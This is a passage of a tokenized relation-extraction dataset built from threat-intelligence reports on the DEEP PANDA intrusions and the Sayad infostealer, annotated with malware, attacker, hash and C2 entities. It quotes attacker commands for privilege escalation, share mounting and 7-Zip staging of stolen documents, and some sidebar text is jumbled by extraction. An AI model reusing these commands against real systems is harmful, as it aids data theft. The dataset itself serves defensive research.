"localgroup", "administrators", ",", "\u201d", "and", "then", "afterward", "to", "deploy", "the", "powershell", "scripts", "."], ["The", "adversary", "used", "stolen", "credentials", "to", "mount", "network", "shares", "via", "\u201c", "net", "use", "\u201d", "command", "."], ["In", "one", "case", ",", "they", "brought", "in", "Cult", "of", "the", "Dead", "Cow", "\u2019s", "NetE", "tool", "onto", "the", "system", ",", "but", "most", "of", "the", "time", "they", "leveraged", "existing", "Windows", "tools", "and", "avoided", "bringing", "many", "new", "tools", "into", "the", "environment", "that", "could", "make", "them", "noisy", "and", "easily", "detectable", "by", "technologies", "that", "scan", "for", "static", "IOCs", "."], ["After", "using", "compromised", "credentials", "to", "mount", "file", "shares", ",", "the", "adversary", "was", "seen", "compressing", "data", "using", "7", "-", "zip", "."], ["They", "were", "adding", "different", "document", "types", "to", "compressed", "files", "by", "wildcarding", "the", "extensions", ",", "such", "as", ":", "\u201c", "C", ":", "Program", "Files7\u00adZip7z", "\u201d", "a", "setup1.log", "\u00adr", "\u00adpkkk", "*", "*"], ["*", "\u201c", "\\<share", "name", ">", "users", "<", "UserName>*rtf", "*", "doc", "\u201d", "\u201c", "C", ":", "Program", "Files7\u00adZip7z", "\u201d", "a", "setup1.log", "\u00adr", "\u00adpkkk", "*", "*", "*", "\u201c", "\\<share", "name", ">", "users", "<", "UserName>*ppt", "\u201d"], ["They", "knew", "exactly", "which", "users", "to", "target", "based", "on", "their", "research", "policy", "area", ",", "and", "they", "rapidly", "pivoted", "from", "China", "/", "Asia", "Pacific", "policy", "experts", "to", "Iraq", "/", "Middle", "East", "policy", "experts", "once", "their", "tasking", "collection", "requirements", "changed", "."], ["http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "5/9", "2016/5/2"], ["Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "Aggressive", "Use", "of", "Ping", "to", "Determine", "Which", "Machines", "of", "Interest", "are", "Online"], ["On", "one", "of", "the", "compromised", "machines", ",", "the", "adversary", "brought", "in", "a", "command", "-", "line", "version", "of", "RAR", "archiver", "that", "was", "named", "\u201c", "cftmon.exe", "\u201d", "and", "placed", "it", "into", "\u201c", "c", ":", "windowstemphotfix", "\u201d", "directory", "."], ["The", "files", "were", "encrypted", "(", "both", "file", "data", "and", "headers", ")", "with", "\u201c", "uinfw", "\u201d", "password", "and", "the", "archive", "files", "were", "named", "after", "the", "initials", "of", "each", "user", "that", "had", "been", "targeted", "and", "stored", "in", "the", "same", "\u201c", "c", ":", "windowstemphotfix", "\u201d", "directory", "."], ["For", "lateral", "movement", ",", "they", "used", "WMI", "to", "deploy", "the", "powershell", "scripts", "remotely", "and", "setup", "scheduled", "tasks", "on", "the", "remote", "systems", "."], ["\ue600", "BLOG", "Despite", "the", "fact", "that", "we", "were", "seeing", "nearly", "identical", "TTPs", "used", "across", "multiple", "think", "-", "tank", "targets", ",", "there", "is", "evidence", "to", "indicate", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "6/9", "2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "that", "these", "operations", "had", "different", "individuals", "behind", "the", "keyboard", "based", "on", "the", "intricacies", "of", "how", "certain", "powershell", "command", "lines", "had", "been", "used", "in", "each", "case", "."], ["Summary", "DEEP", "PANDA", "presents", "a", "very", "serious", "threat", "not", "just", "to", "think", "tanks", ",", "but", "also", "multinational", "financial", "institutions", ",", "law", "firms", ",", "defense", "contractors", ",", "and", "government", "agencies", "."], ["Due", "to", "their", "stellar", "operational", "security", "and", "reliance", "on", "anti", "-", "forensic", "and", "anti", "-", "IOC", "detection", "techniques", ",", "detecting", "and", "stopping", "them", "is", "very", "challenging", "without", "the", "use", "of", "next", "-", "generation", "endpoint", "technology", "like", "Falcon", "Host", "."], ["Not", "only", "was", "Falcon", "Host", "able", "to", "detect", "this", "adversary", "without", "relying", "on", "static", "signatures", "or", "IOCs", ",", "but", "it", "was", "able", "to", "provide", "instantaneous", "and", "full", "forensic", "analysis", "of", "what", "had", "occurred", "on", "each", "of", "the", "compromised", "endpoints", "without", "the", "need", "to", "pull", "hard", "drives", "and", "do", "costly", "and", "time", "-", "intensive", "forensics", ",", "substantially", "reducing", "the", "time", "needed", "for", "remediation", "."], ["If", "you", "are", "a", "non", "-", "profit", "think", "tank", "or", "a", "human", "rights", "organization", "that", "would", "like", "to", "take", "advantage", "of", "our", "no", "-", "charge", "offer", "of"], ["Falcon"], ["Host", "licenses", "for", "your", "servers", "and", "desktops", ",", "please", "email", "us", "at"], ["sales@crowdstrike.com"], ["with", "the", "subject", "\u201c", "Non", "-", "Profit", "Falcon", "Host", "Offer", ".", "\u201d"], ["Our", "Falcon", "Intelligence", "subscribers", "have", "had", "access", "to", "multiple", "reports", "on", "the", "DEEP", "PANDA", "actor", "that", "includes", "full", "analysis", "of", "their", "attribution", ",", "tradecraft", "and", "TTPs", ",", "as", "well", "as", "detection", "\uf077", "indicators", "and", "signatures", "and", "remediation", "instructions", "."], ["And", "our", "CrowdStrike", "Services", "has", "worked", "on", "multiple", "intrusion", "investigations", "related", "to", "DEEP", "PANDA", "in", "the", "last", "year", "."], ["If", "you", "would", "also", "like", "to", "see", "a", "demo", "of", "Falcon", "Host", "or", "Falcon", "Intelligence", "in", "action", "or", "discuss", "our", "Services", "offerings", ",", "please", "contact", "our", "Sales", "Team", "to", "schedule", "a", "personal", "briefing", "."], ["Stay", "safe", "and", "keep", "a", "watchful", "eye", "on", "the", "Pandas", ",", "Bears", ",", "Kittens", ",", "and", "other", "adversaries", "who", "are", "relentlessly", "preying", "on", "your", "data", "!"], ["\uf099", "Tweet", "\uf0e1", "Share", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "7/9", "2016/5/2"], ["Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "Dmitri", "Alperovitch"], ["Co", "-", "founder", "and", "CTO", "of", "Crowdstrike", ",", "Dmitri", "Alperovitch", "leads", "the", "Intelligence", ",", "Technology", "and", "CrowdStrike", "Labs", "teams", "."], ["Alperovitch", "has", "invented", "18", "patented", "technologies", "and", "has", "conducted", "extensive", "research", "on", "reputation", "systems", ",", "spam", "detection", ",", "web", "security", ",", "public", "-", "key", "and", "identity", "-", "based", "cryptography", ",", "malware", "and", "intrusion", "detection", "/", "prevention", "."], ["He", "is", "a", "renowned", "computer", "security", "researcher", "and", "thought", "leader", "on", "cybersecurity", "policies", "and", "state", "tradecraft", "."], ["Alperovitch", "\u2019s", "many", "honors", "include", "being", "selected", "as", "MIT", "Technology", "Review", "\u2019s", "\u201c", "Young", "Innovators", "under", "35", "\u201d", "(", "TR35", ")", "in", "2013", "."], ["He", "also", "was", "named", "Foreign", "Policy", "Magazine", "\u2019s", "Leading", "Global", "Thinker", "for", "2013", "and", "received", "a", "Federal", "100", "Award", "for", "his", "information", "security", "contributions", "."], ["Related", "Content", "U.S.", "\u2013", "China", "Agreement", "on"], ["Cyber"], ["Intrusions", ":", "An", "Inflection", "Point", "Are", "You", "More"], ["Interested", "in", "Stopping", "a"], ["Breach", "or", "Stopping", "Malware", "?"], ["VENOM", "Vulnerability", ":"], ["Community", "Patching", "and", "Mitigation", "Update", "Chinese"], ["This", "is", "a", "Today", ",", "economic", "question", "I", "ask", "a", "CrowdStrike", "espionage", "lot", "of", "disclosed", "a", "reached", "its", "organizations", "critical", "virtual", "boiling", "point", "that", "I", "speak", "with", "."], ["machine", "escape", "some", "time", "ago", ",", "While", "the", "\u2026", "vulnerability", "and", "has", "been", "(", "which", "we", "named", "scalding", "VENOM", ")", "industries", "discovered", "by", "throughout", "\u2026", "our", "\u2026", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "8/9", "2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "\ue603"], ["Copyright", "\u00a9", "2016", "CrowdStrike", "|", "Privacy", "|", "\uf099", "Request", "Info", "|", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "Blog", "|", "Contact", "Us", "|", "\uf0e1", "\uf09a", "\uf16a", "1.888.512.8906", "9/9"]]}, {"vertexSet": [[{"name": "Flying Kitten", "pos": [2, 4], "sent_id": 0, "type": "Malware"}], [{"name": "Iranian Ajax Security Team", "pos": [8, 12], "sent_id": 1, "type": "Attacker"}], [{"name": "Sayad", "pos": [11, 12], "sent_id": 3, "type": "Malware"}], [{"name": "Sayad", "pos": [0, 1], "sent_id": 5, "type": "Malware"}], [{"name": "phishing emails", "pos": [6, 8], "sent_id": 5, "type": "Exploit"}], [{"name": "Sayad", "pos": [10, 11], "sent_id": 7, "type": "Malware"}], [{"name": "Vinsula Execution Engine", "pos": [19, 22], "sent_id": 7, "type": "Software"}], [{"name": "Sayad", "pos": [4, 5], "sent_id": 10, "type": "Malware"}], [{"name": "Sayad", "pos": [13, 14], "sent_id": 21, "type": "Malware"}], [{"name": "8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12", "pos": [1, 2], "sent_id": 22, "type": "Indicator"}], [{"name": "Sayad", "pos": [6, 7], "sent_id": 23, "type": "Malware"}], [{"name": "Vinsula Execution Engine", "pos": [17, 20], "sent_id": 23, "type": "Software"}], [{"name": "WEXTRACT.exe", "pos": [32, 33], "sent_id": 23, "type": "Malware"}], [{"name": "1c52b749403d3f229636f07b0040eb17beba28e4", "pos": [1, 2], "sent_id": 24, "type": "SHA-1"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [19, 20], "sent_id": 24, "type": "Payload"}], [{"name": "69fd05ca3a7514ea79480d1dbb358fab391e738d", "pos": [1, 2], "sent_id": 25, "type": "Indicator"}], [{"name": "DiagnosticsService.dll", "pos": [31, 32], "sent_id": 26, "type": "Malware"}], [{"name": "8521eefbf7336df5c275c3da4b61c94062fafdda", "pos": [33, 34], "sent_id": 26, "type": "SHA-1"}], [{"name": "Sayad", "pos": [0, 1], "sent_id": 27, "type": "Malware"}], [{"name": "Sayad", "pos": [0, 1], "sent_id": 28, "type": "Malware"}], [{"name": "Base64", "pos": [11, 12], "sent_id": 32, "type": "Obfuscation"}], [{"name": "Sayad", "pos": [4, 5], "sent_id": 34, "type": "Malware"}], [{"name": "Ajax Security Team", "pos": [19, 22], "sent_id": 34, "type": "Attacker"}], [{"name": "Sayad", "pos": [8, 9], "sent_id": 40, "type": "Malware"}], [{"name": "Vinsula Execution Engine", "pos": [13, 16], "sent_id": 40, "type": "Software"}], [{"name": "WEXTRACT.exe", "pos": [9, 10], "sent_id": 42, "type": "Malware"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [8, 9], "sent_id": 43, "type": "Malware"}], [{"name": "DiagnosticsService.dll", "pos": [5, 6], "sent_id": 46, "type": "Malware"}], [{"name": "Sayad", "pos": [3, 4], "sent_id": 50, "type": "Malware"}], [{"name": "WEXTRACT.exe", "pos": [5, 6], "sent_id": 54, "type": "Malware"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [2, 3], "sent_id": 55, "type": "Malware"}], [{"name": "DiagnosticsService.dll", "pos": [2, 3], "sent_id": 56, "type": "Malware"}], [{"name": "Sayad", "pos": [20, 21], "sent_id": 58, "type": "Malware"}], [{"name": "WEXTRACT.exe", "pos": [13, 14], "sent_id": 59, "type": "Malware"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [24, 25], "sent_id": 59, "type": "Payload"}], [{"name": "DiagnosticsService.dll", "pos": [2, 3], "sent_id": 62, "type": "Payload"}], [{"name": "WEXTRACT.exe", "pos": [6, 7], "sent_id": 66, "type": "Dropper"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [2, 3], "sent_id": 68, "type": "File"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe.config", "pos": [9, 10], "sent_id": 68, "type": "File"}], [{"name": "WEXTRACT.exe", "pos": [1, 2], "sent_id": 70, "type": "Dropper"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [2, 3], "sent_id": 86, "type": "Malware"}], [{"name": "72641dedb31280b78bf6a0f184ef29b6", "pos": [5, 6], "sent_id": 86, "type": "MD5"}], [{"name": "69fd05ca3a7514ea79480d1dbb358fab391e738d", "pos": [8, 9], "sent_id": 86, "type": "SHA-1"}], [{"name": "C:\\Users\\[User]\\AppData\\Local\\Temp\\IXP000.TMP", "pos": [7, 8], "sent_id": 88, "type": "File"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [19, 20], "sent_id": 89, "type": "Dropper"}], [{"name": "DiagnosticsService.dll", "pos": [2, 3], "sent_id": 101, "type": "Malware"}], [{"name": "432a79f8f1402cb2622b27e26e900d55", "pos": [5, 6], "sent_id": 101, "type": "MD5"}], [{"name": "8521eefbf7336df5c275c3da4b61c94062fafdda", "pos": [2, 3], "sent_id": 102, "type": "SHA-1"}], [{"name": "base.dll", "pos": [2, 3], "sent_id": 103, "type": "Malware"}], [{"name": "4a67b19c02d5cfdebcd85b7395d09881", "pos": [5, 6], "sent_id": 103, "type": "MD5"}], [{"name": "082da03918039125dcf1f096a13ffa9ab6a56bde", "pos": [2, 3], "sent_id": 104, "type": "SHA-1"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [18, 19], "sent_id": 105, "type": "Dropper"}], [{"name": "Sayad", "pos": [16, 17], "sent_id": 111, "type": "Malware"}], [{"name": "WEXTRACT.exe", "pos": [1, 2], "sent_id": 120, "type": "Dropper"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [8, 9], "sent_id": 121, "type": "Dropper"}], [{"name": "DiagnosticsService.dll", "pos": [27, 28], "sent_id": 127, "type": "Malware"}], [{"name": "base.dll", "pos": [25, 26], "sent_id": 136, "type": "Payload"}], [{"name": "Base64", "pos": [9, 10], "sent_id": 137, "type": "Obfuscation"}], [{"name": "e5aac039-cf4a-4b1d-9507-df7001ee2637", "pos": [8, 13], "sent_id": 138, "type": "Indicator"}], [{"name": "hxxp://0o0o0o0o0.com", "pos": [21, 22], "sent_id": 139, "type": "Indicator"}], [{"name": "hxxp://0o0o0o0o0.com/soft.php", "pos": [19, 20], "sent_id": 140, "type": "Indicator"}], [{"name": "sqllite3.dll", "pos": [10, 11], "sent_id": 141, "type": "File"}], [{"name": "Sayad", "pos": [17, 18], "sent_id": 142, "type": "Malware"}], [{"name": "DiagnosticsService.dll", "pos": [20, 21], "sent_id": 142, "type": "File"}], [{"name": "Sayad", "pos": [0, 1], "sent_id": 148, "type": "Malware"}], [{"name": "Sayad Client", "pos": [2, 4], "sent_id": 149, "type": "Malware"}], [{"name": "Sayad Client DLL", "pos": [6, 9], "sent_id": 151, "type": "Malware"}], [{"name": "Sayad", "pos": [45, 46], "sent_id": 151, "type": "Malware"}], [{"name": "Sayad Client", "pos": [1, 3], "sent_id": 307, "type": "Malware"}], [{"name": "f:\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb", "pos": [0, 1], "sent_id": 311, "type": "File"}], [{"name": ":\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb", "pos": [1, 2], "sent_id": 311, "type": "File"}], [{"name": "Sayad Client", "pos": [1, 3], "sent_id": 314, "type": "Malware"}], [{"name": "DiagnosticsService.dll", "pos": [4, 5], "sent_id": 314, "type": "File"}], [{"name": "0o0o0o0o0[dot]com", "pos": [24, 25], "sent_id": 314, "type": "Indicator"}], [{"name": "107.6.182.179", "pos": [29, 30], "sent_id": 314, "type": "Address"}], [{"name": "WEXTRACT.exe", "pos": [1, 2], "sent_id": 317, "type": "File"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [8, 9], "sent_id": 318, "type": "File"}], [{"name": "192.168.64.167", "pos": [11, 12], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [16, 17], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [22, 23], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [27, 28], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [33, 34], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [37, 38], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [43, 44], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [47, 48], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [53, 54], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [57, 58], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [63, 64], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [67, 68], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [73, 74], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [78, 79], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [84, 85], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [90, 91], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [99, 100], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [104, 105], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [110, 111], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [115, 116], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [121, 122], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [125, 126], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [131, 132], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [135, 136], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [141, 142], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [145, 146], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [151, 152], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [155, 156], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [161, 162], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [166, 167], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [172, 173], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [177, 178], "sent_id": 322, "type": "Address"}], [{"name": "192.168.64.167", "pos": [183, 184], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [187, 188], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [188, 189], "sent_id": 322, "type": "Address"}], [{"name": "107.6.182.179", "pos": [192, 193], "sent_id": 322, "type": "Address"}], [{"name": "0o0o0o0o0[dot]com", "pos": [9, 10], "sent_id": 323, "type": "Indicator"}], [{"name": "107.6.182.179", "pos": [12, 13], "sent_id": 323, "type": "Address"}], [{"name": "June 30, 2014", "pos": [5, 9], "sent_id": 324, "type": "Time"}], [{"name": "WEXTRACT.exe", "pos": [2, 3], "sent_id": 353, "type": "Malware"}], [{"name": "a7813001063a23627404887b43616386", "pos": [5, 6], "sent_id": 353, "type": "MD5"}], [{"name": "1c52b749403d3f229636f07b0040eb17beba28e4", "pos": [8, 9], "sent_id": 353, "type": "SHA-1"}], [{"name": "8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12", "pos": [11, 12], "sent_id": 353, "type": "SHA-256"}], [{"name": "15/07/2014 6:17:44 PM", "pos": [3, 6], "sent_id": 354, "type": "Time"}], [{"name": "17/07/2014 10:21:15 AM", "pos": [9, 12], "sent_id": 354, "type": "Time"}], [{"name": "~8f60957b3689075fa093b047242c0255.exe", "pos": [2, 3], "sent_id": 357, "type": "Malware"}], [{"name": "72641dedb31280b78bf6a0f184ef29b6", "pos": [5, 6], "sent_id": 357, "type": "MD5"}], [{"name": "69fd05ca3a7514ea79480d1dbb358fab391e738d", "pos": [8, 9], "sent_id": 357, "type": "SHA-1"}], [{"name": "780c86ec885ea48316995ae69965e314a750848413f94907cf54bdeba09b5c3c", "pos": [11, 12], "sent_id": 357, "type": "SHA-256"}], [{"name": "14/07/2014 9:53:14 AM", "pos": [15, 18], "sent_id": 357, "type": "Time"}], [{"name": "19/07/2014 12:00:58 PM", "pos": [21, 24], "sent_id": 357, "type": "Time"}], [{"name": "DiagnosticsService.dll", "pos": [0, 1], "sent_id": 359, "type": "Malware"}], [{"name": "432a79f8f1402cb2622b27e26e900d55", "pos": [3, 4], "sent_id": 359, "type": "MD5"}], [{"name": "8521eefbf7336df5c275c3da4b61c94062fafdda", "pos": [6, 7], "sent_id": 359, "type": "SHA-1"}], [{"name": "bae3171917daf3eb498ae2fb1d0fcbfbb684a5314a8cbef2d5e3bd4c30ece8e1", "pos": [9, 10], "sent_id": 359, "type": "SHA-256"}], [{"name": "17/07/2014 10:16:25 AM", "pos": [3, 6], "sent_id": 360, "type": "Time"}], [{"name": "17/07/2014 2:17:55 PM", "pos": [9, 12], "sent_id": 360, "type": "Time"}], [{"name": "sqlite3.dll", "pos": [2, 3], "sent_id": 361, "type": "Malware"}], [{"name": "25c3720c06de6d9b584a06ddf44c079c24df30ce", "pos": [8, 9], "sent_id": 361, "type": "SHA-1"}], [{"name": "c8571f963541414666397dce06657594560eed4943c93780eb7a2358f0645515", "pos": [11, 12], "sent_id": 361, "type": "SHA-256"}], [{"name": "base.dll", "pos": [2, 3], "sent_id": 362, "type": "Malware"}], [{"name": "4a67b19c02d5cfdebcd85b7395d09881", "pos": [5, 6], "sent_id": 362, "type": "MD5"}], [{"name": "082da03918039125dcf1f096a13ffa9ab6a56bde", "pos": [8, 9], "sent_id": 362, "type": "SHA-1"}], [{"name": "35cd39d419ab386aaa534b4ce95aa7fcda696ef6960fd103beaecf71bacd7398", "pos": [11, 12], "sent_id": 362, "type": "SHA-256"}]], "labels": [{"r": "P2", "h": 1, "t": 0, "evidence": [0, 1]}, {"r": "P21", "h": 9, "t": 8, "evidence": [21, 22]}, {"r": "P21", "h": 13, "t": 12, "evidence": [23, 24]}, {"r": "P13", "h": 12, "t": 14, "evidence": [23, 24]}, {"r": "P21", "h": 15, "t": 12, "evidence": [23, 25]}, {"r": "P21", "h": 17, "t": 16, "evidence": [26]}, {"r": "P13", "h": 19, "t": 20, "evidence": [28, 32]}, {"r": "P2", "h": 22, "t": 21, "evidence": [34]}, {"r": "P13", "h": 33, "t": 34, "evidence": [59]}, {"r": "P13", "h": 33, "t": 35, "evidence": [59, 62]}, {"r": "P21", "h": 37, "t": 36, "evidence": [66, 68]}, {"r": "P21", "h": 38, "t": 36, "evidence": [66, 68]}, {"r": "P21", "h": 41, "t": 40, "evidence": [86]}, {"r": "P21", "h": 42, "t": 40, "evidence": [86]}, {"r": "P21", "h": 43, "t": 40, "evidence": [86, 88]}, {"r": "P21", "h": 46, "t": 45, "evidence": [101]}, {"r": "P21", "h": 47, "t": 45, "evidence": [101, 102]}, {"r": "P21", "h": 49, "t": 48, "evidence": [103]}, {"r": "P21", "h": 50, "t": 48, "evidence": [103, 104]}, {"r": "P21", "h": 58, "t": 62, "evidence": [138, 142]}, {"r": "P21", "h": 59, "t": 62, "evidence": [139, 142]}, {"r": "P21", "h": 60, "t": 62, "evidence": [140, 142]}, {"r": "P21", "h": 61, "t": 62, "evidence": [141, 142]}, {"r": "P21", "h": 63, "t": 62, "evidence": [142]}, {"r": "P21", "h": 69, "t": 68, "evidence": [307, 311]}, {"r": "P21", "h": 70, "t": 68, "evidence": [307, 311]}, {"r": "P21", "h": 72, "t": 71, "evidence": [314]}, {"r": "P21", "h": 73, "t": 71, "evidence": [314]}, {"r": "P28", "h": 71, "t": 74, "evidence": [314]}, {"r": "P21", "h": 75, "t": 71, "evidence": [314, 317]}, {"r": "P21", "h": 76, "t": 71, "evidence": [314, 318]}, {"r": "P21", "h": 117, "t": 116, "evidence": [353]}, {"r": "P21", "h": 118, "t": 116, "evidence": [353]}, {"r": "P21", "h": 119, "t": 116, "evidence": [353]}, {"r": "P33", "h": 116, "t": 120, "evidence": [353, 354]}, {"r": "P33", "h": 116, "t": 121, "evidence": [353, 354]}, {"r": "P21", "h": 123, "t": 122, "evidence": [357]}, {"r": "P21", "h": 124, "t": 122, "evidence": [357]}, {"r": "P21", "h": 125, "t": 122, "evidence": [357]}, {"r": "P33", "h": 122, "t": 126, "evidence": [357]}, {"r": "P33", "h": 122, "t": 127, "evidence": [357]}, {"r": "P21", "h": 129, "t": 128, "evidence": [359]}, {"r": "P21", "h": 130, "t": 128, "evidence": [359]}, {"r": "P21", "h": 131, "t": 128, "evidence": [359]}, {"r": "P33", "h": 128, "t": 132, "evidence": [359, 360]}, {"r": "P33", "h": 128, "t": 133, "evidence": [359, 360]}, {"r": "P21", "h": 135, "t": 134, "evidence": [361]}, {"r": "P21", "h": 136, "t": 134, "evidence": [361]}, {"r": "P21", "h": 138, "t": 137, "evidence": [362]}, {"r": "P21", "h": 139, "t": 137, "evidence": [362]}, {"r": "P21", "h": 140, "t": 137, "evidence": [362]}, {"r": "P28", "h": 0, "t": 77, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 78, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 79, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 80, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 81, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 82, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 83, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 84, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 85, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 86, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 87, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 88, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 89, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 90, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 91, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 92, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 93, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 94, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 95, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 96, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 97, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 98, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 99, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 100, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 101, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 102, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 103, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 104, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 105, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 106, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 107, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 108, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 109, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 110, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 111, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 112, "evidence": [0, 322]}, {"r": "P28", "h": 0, "t": 114, "evidence": [0, 323]}], "title": "201407VinsulaSayad", "sents": [["Sayad", "(", "Flying", "Kitten", ")"], ["Infostealer", "\u2013", "is", "this", "the", "work", "of", "the", "Iranian", "Ajax", "Security", "Team", "?"], ["Information", "stealing", "malware", "has", "become", "increasingly", "popular", "among", "malware", "authors", "targeting", "not", "just", "typical", "end", "-", "users", ",", "but", "also", "specific", "organizations", "and", "states", "."], ["We", "have", "come", "across", "an", "intriguing", "piece", "of", "malware", "(", "dubbed", "Sayad", ")", "that", "implements", "multiple", "host", "data", "collection", "methods", "and", "wraps", "them", "up", "into", "a", "single", ".NET"], ["DLL", "."], ["Sayad", "malware", "is", "typically", "distributed", "through", "phishing", "emails", "."], ["Introduction"], ["This", "week", "I", "got", "hold", "of", "a", "sample", "of", "\u201c", "Sayad", "\u201d", ",", "so", "I", "ran", "it", "through", "our", "Vinsula", "Execution", "Engine", "(", "VEE", ")", "to", "find", "out", "what", "it", "does", "and", "how", "it", "works", "."], ["Credit", "for", "sharing", "the", "sample", "of", "the", "malware", "goes", "to", "@MalwareChannel", "."], ["The", "information", "this", "malware", "is", "able", "to", "steal", "and", "upload", "to", "a", "Web", "server", "controlled", "by", "the", "hackers", "is", "highly", "sensitive", "and", "would", "have", "an", "enormous", "impact", "on", "compromised", "individuals", ",", "businesses", ",", "and", "governments", "."], ["Some", "of", "the", "tasks", "Sayad", "is", "designed", "to", "accomplish", "include", ":", "Get", "and", "send", "host", "system", "information", ",", "including", ":", "Host", "computer", "name", "Internal", "and", "external", "IPs"], ["Languages", "installed", "User", "name", "Running", "processes", "Open", "ports", "Capture", "and", "record", "keystrokes", "through", "a", "user", "mode", "key", "logger"], ["Periodically", "capture", "information", "stored", "in", "the", "clipboard"], ["Collect", "and", "transfer", "user", "information", "for", "FTP", "Clients", "\u2013", "FileZilla", "and", "WinSCP"], ["Get", "data", "account", "information", "for", "FileZilla", "FTP", "Server", "Transfer", "Kerio", "VPN", "client", "user", "configuration", "files", "Collect", "and", "transfer", "bookmarks", "for", 